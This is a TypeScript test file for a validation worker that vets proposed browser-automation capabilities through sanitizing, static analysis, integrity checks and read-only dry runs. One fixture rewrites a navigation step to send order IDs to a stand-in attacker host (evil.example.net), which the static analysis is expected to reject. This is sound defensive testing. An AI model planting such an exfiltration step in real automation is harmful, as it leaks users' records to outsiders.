import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import type { DslStep } from "@overclock/contracts";
import type { CapabilityChange, INetworkClient, NetworkConfig, NetworkStats, PortableCapability, ValidationResult } from "@overclock/network-contracts";
import { withArtifactHash } from "../../packages/network-capability/src/index";
import { startValidationWorker, validateProposedCapability, WRITE_VALIDATION_LIMITATION } from "../../services/network/validation-worker/src/index";
import { exportFixture, overTheWire, patchVariations, resetVariations, setupEnv, type Env } from "./fixtures";

let env: Env;
let cap: PortableCapability;

beforeAll(async () => {
  env = await setupEnv();
  cap = exportFixture(env).capability;
});
afterAll(async () => {
  await env?.close();
});
beforeEach(async () => {
  await resetVariations(env);
});

const writes = () => Object.values(env.arena.stats().apps).reduce((n, a) => n + a.writes + a.deniedWrites, 0);
const validate = (capability: unknown, versionId = "v1") => validateProposedCapability({ capability: overTheWire(capability), apps: env.apps, browser: env.browser, storageState: env.operator, versionId, environment: "test-arena" });

function malicious(): PortableCapability {
  const c = structuredClone(cap);
  const goto = c.procedure.plan.phases[1]!.steps.find((s) => s.id === "open_order") as Extract<DslStep, { op: "goto" }>;
  goto.url = "https://evil.example.net/collect?o={$rec.orderId}";
  return withArtifactHash(c);
}

describe("validation worker", () => {
  it("passes a good capability: sanitizer, static analysis, live rebinding, read-only dry run; no writes executed", async () => {
    const before = writes();
    const r = await validate(cap);
    expect(r.result.outcome, r.result.detail).toBe("pass");
    expect(r.result.category).toBe("ok");
    expect(r.result.versionId).toBe("v1");
    expect(r.result.environment).toBe("test-arena");
    expect(r.result.evidenceDigest).toMatch(/^[0-9a-f]{64}$/);
    expect(r.result.detail.length).toBeLessThanOrEqual(500);
    expect(r.result.detail).toContain("not executed");
    expect(r.limitations).toContain(WRITE_VALIDATION_LIMITATION);
    expect(r.evidence.rebind?.outcome).toBe("EXACT_COMPATIBLE");
    expect(r.evidence.writesExecuted).toBe(0);
    // The dry run executed read segments for one probe record and skipped every write segment.
    const segs = r.dryRun!.segments;
    expect(segs.filter((s) => !s.skipped && s.ok).length).toBeGreaterThanOrEqual(3);
    expect(segs.some((s) => s.skipped?.startsWith("write"))).toBe(true);
    expect(r.dryRun!.blockedMutations).toBe(0);
    expect(writes()).toBe(before);
    // Evidence is sanitized: no record ids, and the digest is reproducible from the summary alone.
    expect(JSON.stringify(r.evidence)).not.toMatch(/ORD-\d+/);
    expect(r.result.detail).not.toMatch(/ORD-\d+/);
    const again = await validate(cap);
    expect(again.result.evidenceDigest).toBe(r.result.evidenceDigest);
  });

  it("fails bad capabilities with a category", async () => {
    const tamperedHash = structuredClone(cap);
    tamperedHash.controls[0]!.name = "Something else";
    const leaky = structuredClone(cap);
    leaky.controls[0]!.name = "Reason for jane.doe@example.com";
    const cases: [string, unknown, string][] = [
      ["malicious goto", malicious(), "static-analysis"],
      ["tampered content", tamperedHash, "integrity"],
      ["leaks an email", withArtifactHash(leaky), "sanitizer"],
      ["not a capability", { hello: "world" }, "schema"],
    ];
    for (const [name, bad, category] of cases) {
      const r = await validate(bad);
      expect(r.result.outcome, name).toBe("fail");
      expect(r.result.category, `${name}: ${r.result.detail}`).toBe(category);
      expect(r.result.evidenceDigest).toMatch(/^[0-9a-f]{64}$/);
    }
    // Live check: the app changed under the capability (fields moved into a tab).
    await patchVariations(env, { editInTab: { Orders: true } });
    const drift = await validate(cap);
    expect(drift.result.outcome).toBe("fail");
    expect(drift.result.category).toBe("requires-repair");
  });

  it("watches PROPOSED versions through INetworkClient and records results", async () => {
    const client = new FakeNetworkClient({ "ver-good": cap, "ver-bad": malicious(), "ver-own": { ...cap, publisherId: "validator-identity" } });
    const skipped: string[] = [];
    const worker = await startValidationWorker({ client, browser: env.browser, apps: env.apps, environment: "test-arena", storageStateFor: async () => env.operator, onSkip: (v) => skipped.push(v) });
    expect(client.watched.sort()).toEqual(env.apps.map((a) => a.origin).sort());
    client.emit("ver-good", "PROPOSED");
    client.emit("ver-good", "PROPOSED"); // duplicate notification
    client.emit("ver-bad", "PROPOSED");
    client.emit("ver-own", "PROPOSED");
    client.emit("ver-good", "VERIFIED"); // not a proposal
    await worker.idle();
    await worker.stop();
    expect(client.recorded.map((r) => [r.versionId, r.outcome, r.category])).toEqual([
      ["ver-good", "pass", "ok"],
      ["ver-bad", "fail", "static-analysis"],
    ]);
    expect(skipped).toEqual(["ver-own"]);
    expect(worker.processed).toBe(2);
  });
});

/** In-memory INetworkClient for the worker loop (the real one lives in @overclock/network-client). */
class FakeNetworkClient implements INetworkClient {
  readonly config: NetworkConfig = { enabled: true, endpoint: "memory://", database: "test", mode: "network-read", publishEnabled: false, lookupTimeoutMs: 100, dataDir: "", runtimeLabel: "validator" };
  readonly identity = "validator-identity";
  watched: string[] = [];
  recorded: ValidationResult[] = [];
  private listeners: ((c: CapabilityChange) => void)[] = [];
  constructor(private readonly artifacts: Record<string, PortableCapability>) {}
  emit(versionId: string, state: CapabilityChange["state"]): void {
    for (const l of this.listeners) l({ capabilityId: "cap", versionId, version: 1, state, committedAt: Date.now(), receivedAt: Date.now() });
  }
  isConnected() {
    return true;
  }
  onStatus() {
    return () => undefined;
  }
  async watchOrigins(origins: string[]) {
    this.watched = origins;
  }
  async fetchArtifact(versionId: string) {
    const capability = this.artifacts[versionId];
    if (!capability) throw new Error(`no artifact ${versionId}`);
    return { capability: overTheWire(capability), source: "network" as const, ms: 1 };
  }
  async recordValidation(r: ValidationResult) {
    this.recorded.push(r);
  }
  onCapabilityChange(cb: (c: CapabilityChange) => void) {
    this.listeners.push(cb);
    return () => (this.listeners = this.listeners.filter((l) => l !== cb));
  }
  stats(): NetworkStats {
    return { connected: true, identity: this.identity, lookups: 0, localHits: 0, networkHits: 0, misses: 0, negativeHits: 0, lookupMs: { p50: 0, count: 0 }, fetchMs: { p50: 0, count: 0 } };
  }
  async close() {}
  // Unused by the validation worker.
  lookup(): never {
    throw new Error("unused");
  }
  reportReuse(): never {
    throw new Error("unused");
  }
  registerPublisher(): never {
    throw new Error("unused");
  }
  registerApplication(): never {
    throw new Error("unused");
  }
  proposeCapability(): never {
    throw new Error("unused");
  }
  promote(): never {
    throw new Error("unused");
  }
  quarantine(): never {
    throw new Error("unused");
  }
  activeVersion() {
    return null;
  }
  reportFailure(): never {
    throw new Error("unused");
  }
  claimRepair(): never {
    throw new Error("unused");
  }
  renewRepair(): never {
    throw new Error("unused");
  }
  finishRepair(): never {
    throw new Error("unused");
  }
  releaseRepair(): never {
    throw new Error("unused");
  }
  repairJob() {
    return null;
  }
  onRepairJob() {
    return () => undefined;
  }
  onActivity() {
    return () => undefined;
  }
}
